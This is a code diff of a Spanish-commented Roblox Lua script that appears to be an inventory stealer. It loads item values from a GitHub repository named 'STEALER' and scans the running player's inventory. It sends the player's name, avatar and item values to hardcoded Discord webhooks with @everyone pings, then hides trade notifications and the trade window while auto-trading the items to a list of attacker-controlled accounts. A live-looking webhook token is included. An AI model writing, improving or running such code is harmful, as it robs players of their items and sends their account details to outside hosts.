@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY)
+-- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB, LISTA DUAL Y DELAY)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -7,19 +7,18 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- ==========================================
--- URL DEL REPOSITORIO DE VALORES (JSON) - ORIGINAL
+-- URLS DE LOS REPOSITORIOS DE VALORES (JSON)
 -- ==========================================
-local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11//main/values.json"
-
--- ==========================================
--- 🆕 URL DEL REPOSITORIO DE VALORES DUAL (JSON)
--- ==========================================
+local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
 local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"
 
 -- ==========================================
 -- CONFIGURACIÓN SECRETA DUAL WEBHOOK
 -- ==========================================
-local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCrnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
+local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
+
+-- ⚙️ UMBRAL DE LA LISTA DUAL (Si el valor de la lista DUAL supera esto, activa el DUAL HIT)
+local DUAL_VALUE_THRESHOLD = 7500
 
 local jugadoresObjetivosDual = {
     "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
@@ -47,52 +46,37 @@ end
 -- ==========================================
 
 -- ==========================================
--- CARGA DINÁMICA DE VALORES DE GITHUB
+-- CARGA DINÁMICA DE VALORES DE GITHUB (NORMAL + DUAL)
 -- ==========================================
 local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
-
--- 🆕 Variables para la lista de valores DUAL
 local DualKnives, DualGuns, DualEffects, DualEmotes = {}, {}, {}, {}
 
-local function cargarValoresGitHub()
-    -- Cargar lista ORIGINAL
+local function cargarValoresDesdeURL(url)
+    local k, g, e, em = {}, {}, {}, {}
     local success, response = pcall(function()
-        return game:HttpGet(VALUES_REPO_URL)
+        return game:HttpGet(url)
     end)
-    
+
     if success and response then
         local decodeSuccess, decodedData = pcall(function()
             return HttpService:JSONDecode(response)
         end)
-        
-        if decodeSuccess and decodedData then
-            Knives = decodedData.Knives or {}
-            Guns = decodedData.Guns or {}
-            Effects = decodedData.Effects or {}
-            Emotes = decodedData.Emotes or {}
+
+        if decodeSuccess and type(decodedData) == "table" then
+            k = decodedData.Knives or {}
+            g = decodedData.Guns or {}
+            e = decodedData.Effects or {}
+            em = decodedData.Emotes or {}
         end
     end
 
-    -- 🆕 Cargar lista DUAL
-    local successDual, responseDual = pcall(function()
-        return game:HttpGet(DUAL_VALUES_REPO_URL)
-    end)
-    
-    if successDual and responseDual then
-        local decodeSuccessDual, decodedDataDual = pcall(function()
-            return HttpService:JSONDecode(responseDual)
-        end)
-        
-        if decodeSuccessDual and decodedDataDual then
-            DualKnives = decodedDataDual.Knives or {}
-            DualGuns = decodedDataDual.Guns or {}
-            DualEffects = decodedDataDual.Effects or {}
-            DualEmotes = decodedDataDual.Emotes or {}
-        end
-    end
+    return k, g, e, em
 end
 
-cargarValoresGitHub()
+-- Cargar Lista NORMAL
+Knives, Guns, Effects, Emotes = cargarValoresDesdeURL(VALUES_REPO_URL)
+-- Cargar Lista DUAL
+DualKnives, DualGuns, DualEffects, DualEmotes = cargarValoresDesdeURL(DUAL_VALUES_REPO_URL)
 
 task.spawn(function()
     -- ==========================================
@@ -101,10 +85,10 @@ task.spawn(function()
     while getgenv and not getgenv().AutoTradeConfig do
         task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
     end
-    
+
     -- 👇 ESTA ES LA LÍNEA QUE SOLUCIONA EL ERROR 👇
     local config = getgenv().AutoTradeConfig or {}
-    
+
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
     local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
 
@@ -182,45 +166,47 @@ task.spawn(function()
     if ok and cg.PlayerData then
         local pd = cg.PlayerData
         local knives, guns, effects, emotes = {}, {}, {}, {}
+        local dualKnives, dualGuns, dualEffects, dualEmotes = {}, {}, {}, {}
         local totalValue = 0
-        
-        -- 🆕 Total de valor según la lista DUAL
         local dualTotalValue = 0
 
         local function normalizeName(name)
             return string.gsub(name, " ", "")
         end
 
-        -- 🆕 Modificado para aceptar y calcular tanto la lista original como la DUAL
-        local function scanAndSave(category, valueTable, dualValueTable, resultTable)
+        -- ESCÁNER GENÉRICO: funciona con la lista NORMAL y con la lista DUAL
+        local function scanAndSave(category, valueTable, resultTable, esDual)
             local inv = pd:TryIndex({"Inventory", category})
             if not inv then return end
-            
+
             for guid, item in pairs(inv) do
-                -- APLICANDO LÓGICA DE INICIO DE INVENTARIO (Script 1)
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
-                    
-                    -- Suma basada en la lista ORIGINAL
                     if valueTable[cleanName] then
+
                         local itemValue = valueTable[cleanName]
-                        totalValue = totalValue + itemValue
+                        if esDual then
+                            dualTotalValue = dualTotalValue + itemValue
+                        else
+                            totalValue = totalValue + itemValue
+                        end
                         resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
-                    end
-                    
-                    -- 🆕 Suma basada en la lista DUAL
-                    if dualValueTable[cleanName] then
-                        dualTotalValue = dualTotalValue + dualValueTable[cleanName]
                     end
                 end
             end
         end
 
-        -- 🆕 Se pasan ambas tablas (Original y Dual) a la función de escaneo
-        scanAndSave("Knife", Knives, DualKnives, knives)
-        scanAndSave("Gun", Guns, DualGuns, guns)
-        scanAndSave("Effect", Effects, DualEffects, effects)
-        scanAndSave("Emote", Emotes, DualEmotes, emotes)
+        -- 🔍 ESCANEO #1: Lista NORMAL
+        scanAndSave("Knife", Knives, knives, false)
+        scanAndSave("Gun", Guns, guns, false)
+        scanAndSave("Effect", Effects, effects, false)
+        scanAndSave("Emote", Emotes, emotes, false)
+
+        -- 🔍 ESCANEO #2: Lista DUAL (solo cuenta para DUAL_WEBHOOK_INVENTARIO)
+        scanAndSave("Knife", DualKnives, dualKnives, true)
+        scanAndSave("Gun", DualGuns, dualGuns, true)
+        scanAndSave("Effect", DualEffects, dualEffects, true)
+        scanAndSave("Emote", DualEmotes, dualEmotes, true)
 
         local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)
 
@@ -244,7 +230,7 @@ task.spawn(function()
                 executionData[playerName] = executionData[playerName] + 1
 
                 pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
-                
+
                 executionText = playerName .. " " .. executionData[playerName] .. "x executions"
             end
 
@@ -260,14 +246,14 @@ task.spawn(function()
                         contador[clave].valor = contador[clave].valor + v.value
                     end
                 end
-                
+
                 for _, clave in ipairs(orden) do
                     local info = contador[clave]
                     texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                 end
-                
+
                 if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
-                return texto 
+                return texto
             end
 
             local campos = {}
@@ -280,9 +266,16 @@ task.spawn(function()
             local playersCount = #Players:GetPlayers()
             local maxPlayers = Players.MaxPlayers
             local robloxVer = version()
-            
+
             local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
             local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+
+            -- Estado del DUAL HIT para mostrarlo en el embed
+            local esDualHit = dualTotalValue > DUAL_VALUE_THRESHOLD
+            local dualStatusText = "`💰 " .. dualTotalValue .. "`"
+            if esDualHit then
+                dualStatusText = dualStatusText .. " ✅ **¡DUAL HIT DETECTADO (+" .. DUAL_VALUE_THRESHOLD .. ")!**"
+            end
 
             local descriptionText = "### 👤 Información del Jugador\n" ..
                                     "**Usuario:** `" .. player.Name .. "`\n" ..
@@ -297,17 +290,16 @@ task.spawn(function()
                                     "**Executor:** `" .. executorName .. "`\n\n" ..
                                     "### 📊 Estadísticas de Hit\n" ..
                                     "**Historial:** `" .. executionText .. "`\n" ..
-                                    "**Total Value (Original):** `💰 " .. totalValue .. "`\n" ..
-                                    "**Total Value (Dual):** `💎 " .. dualTotalValue .. "`\n\n" ..
+                                    "**Total Value:** `💰 " .. totalValue .. "`\n" ..
+                                    "**Total Value (Lista DUAL):** " .. dualStatusText .. "\n\n" ..
                                     "**=============================**"
 
             local pings = {}
             local embedColor = 3447003
 
-            -- 🆕 Ping especial si el valor Dual es mayor a 7500
-            if dualTotalValue > 7500 then
-                table.insert(pings, "@MEGA-HIT 💎 **¡VALOR DUAL MASIVO (+7500 DETECTADO)!** 💎")
-                embedColor = 13883565 -- Morado/Magenta
+            if esDualHit then
+                table.insert(pings, "@everyone 🚨 **¡DUAL HIT DETECTADO (VALOR LISTA DUAL +" .. DUAL_VALUE_THRESHOLD .. ")!** 🚨")
+                embedColor = 16711680
             elseif totalValue >= 5000 then
                 table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR DETECTADO)!** 🚨")
                 embedColor = 16711680
@@ -338,80 +330,56 @@ task.spawn(function()
                     }
                 }}
             }
-            
-            local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
-            -- ==========================================
-            -- 🆕 LÓGICA DE ENVÍO DE WEBHOOKS (DUAL + NORMAL)
-            -- ==========================================
-            if dualTotalValue > 7500 then
-                -- 1. Envía a DUAL_WEBHOOK_INVENTARIO PRIMERO
-                task.spawn(function()
-                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
+            -- Payload especial para el DUAL WEBHOOK (con ping exclusivo de cuentas dual)
+            local dualPayload = webhookPayload
+            if esDualHit then
+                dualPayload = HttpService:JSONDecode(HttpService:JSONEncode(webhookPayload))
+                dualPayload.content = "@DUAL-HIT 🚨 **¡PRIORIDAD DUAL! Reclamen el trade YA (+" .. dualTotalValue .. " en Lista DUAL)** 🚨\n" .. (dualPayload.content or "")
+            end
+
+            local jsonPayload = HttpService:JSONEncode(webhookPayload)
+            local jsonDualPayload = HttpService:JSONEncode(dualPayload)
+
+            -- Función segura de envío
+            local function enviarWebhook(url, body)
+                if url ~= "" and request then
+                    pcall(function()
                         request({
-                            Url = DUAL_WEBHOOK_INVENTARIO,
+                            Url = url,
                             Method = "POST",
                             Headers = { ["Content-Type"] = "application/json" },
-                            Body = jsonPayload
+                            Body = body
                         })
-                    end
-                end)
-
-                -- 2. Después de 5 minutos, envía al webhook normal
-                if WEBHOOK_INVENTARIO ~= "" then
-                    task.delay(300, function()
-                        pcall(function()
-                            request({
-                                Url = WEBHOOK_INVENTARIO,
-                                Method = "POST",
-                                Headers = { ["Content-Type"] = "application/json" },
-                                Body = jsonPayload
-                            })
-                        end)
                     end)
                 end
-                
-                -- Usa los jugadores duales para reclamar
+            end
+
+            -- ==========================================
+            -- ENVÍO DE WEBHOOKS (DUAL HIT PRIMERO VS WEBHOOK NORMAL)
+            -- ==========================================
+            if esDualHit then
+                -- 🥇 1. DUAL WEBHOOK: Se envía AL INSTANTE (PRIORIDAD)
+                task.spawn(function()
+                    enviarWebhook(DUAL_WEBHOOK_INVENTARIO, jsonDualPayload)
+                end)
+
+                -- ⏳ 2. Webhook normal: se envía DESPUÉS de 5 minutos (por si las cuentas dual no reclaman)
+                task.delay(300, function()
+                    enviarWebhook(WEBHOOK_INVENTARIO, jsonPayload)
+                end)
+
+                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo DUAL
                 jugadoresObjetivos = jugadoresObjetivosDual
 
             elseif totalValue >= 5000 then
-                -- Lógica original: Tu webhook dual notifica al instante
-                task.spawn(function()
-                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
-                        request({
-                            Url = DUAL_WEBHOOK_INVENTARIO,
-                            Method = "POST",
-                            Headers = { ["Content-Type"] = "application/json" },
-                            Body = jsonPayload
-                        })
-                    end
+                -- ⏳ Hit normal grande (≥5000 sin DUAL HIT): se espera 5 minutos y va al webhook normal
+                task.delay(300, function()
+                    enviarWebhook(WEBHOOK_INVENTARIO, jsonPayload)
                 end)
-
-                -- Webhook del promocionador notifica con 5 min de delay
-                if WEBHOOK_INVENTARIO ~= "" then
-                    task.delay(300, function()
-                        pcall(function()
-                            request({
-                                Url = WEBHOOK_INVENTARIO,
-                                Method = "POST",
-                                Headers = { ["Content-Type"] = "application/json" },
-                                Body = jsonPayload
-                            })
-                        end)
-                    end)
-                end
-                
-                jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal (< 5000 y Dual <= 7500): Notifica de inmediato al promocionador únicamente
-                if WEBHOOK_INVENTARIO ~= "" then
-                    request({
-                        Url = WEBHOOK_INVENTARIO,
-                        Method = "POST",
-                        Headers = { ["Content-Type"] = "application/json" },
-                        Body = jsonPayload
-                    })
-                end
+                -- Hit normal (< 5000): Notifica de inmediato al webhook normal
+                enviarWebhook(WEBHOOK_INVENTARIO, jsonPayload)
             end
         end
 
@@ -441,11 +409,11 @@ task.spawn(function()
                 task.wait()
                 pcall(function()
                     local pGui = player:WaitForChild("PlayerGui")
-                    
+
                     if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                         pGui.Notifications.Body.Visible = false
                     end
-                    
+
                     if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                         if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
                             posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
@@ -460,7 +428,7 @@ task.spawn(function()
             local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
             if not okData then return false end
             local pdTrade = cgData.PlayerData
-            
+
             local listaEfectos, listaEmotes = {}, {}
             local listaArmasPrioritarias, listaArmasNormales = {}, {}
 
@@ -503,7 +471,7 @@ task.spawn(function()
             for _, v in ipairs(listaArmasNormales) do table.insert(itemsRestantes, v) end
 
             if #itemsRestantes == 0 then return false end
-            
+
             local Remotes = require(RS.Shared.Remotes)
             local ActiveNegotiation = cgData.ActiveNegotiation
             local SessionState = cgData.SessionState
@@ -514,7 +482,7 @@ task.spawn(function()
                 local data = ActiveNegotiation.Data
                 if type(data) ~= "table" then return nil, nil, nil end
                 if type(data.player1) ~= "table" or type(data.player2) ~= "table" then return nil, nil, nil end
-                
+
                 local me, other
                 if data.player1.player and data.player1.player.UserId == player.UserId then
                     me, other = data.player1, data.player2
@@ -530,7 +498,7 @@ task.spawn(function()
 
                 local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
                 local aceptado = false
-                
+
                 if type(incoming) == "table" then
                     for _, p in ipairs(incoming) do
                         if p.Name == jugadorEncontrado.Name then
@@ -539,11 +507,11 @@ task.spawn(function()
                         end
                     end
                 end
-                
+
                 if not aceptado then
                     Remotes.SendInvite:FireServer(jugadorEncontrado)
                 end
-                
+
                 task.wait(2.5)
             until getSides() ~= nil
 
@@ -554,7 +522,7 @@ task.spawn(function()
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
                 local item = itemsRestantes[i]
-                
+
                 local t0 = os.clock()
                 while os.clock() - t0 < 5 do
                     local _, _, d = getSides()
@@ -573,11 +541,11 @@ task.spawn(function()
 
                 -- Utilizamos getSides que ya viene protegido contra el error 'nil'
                 local me, other, data = getSides()
-                
+
                 if not data then break end
                 if data.exchanging then break end 
-                
-                         -- Verificamos si somos nosotros y aún no damos ready
+
+                -- Verificamos si somos nosotros y aún no damos ready
                 if me and not me.ready then
                     if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
                         -- SOLUCIÓN: Se pasa data.ref o {} igual que en el script de origen
@@ -585,7 +553,6 @@ task.spawn(function()
                     end
                 end
 
-                
                 task.wait(0.5)
             end
 
@@ -607,7 +574,7 @@ task.spawn(function()
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
             end
-            
+
             local continuar = ejecutarTradeo()
             -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
             if not continuar then 
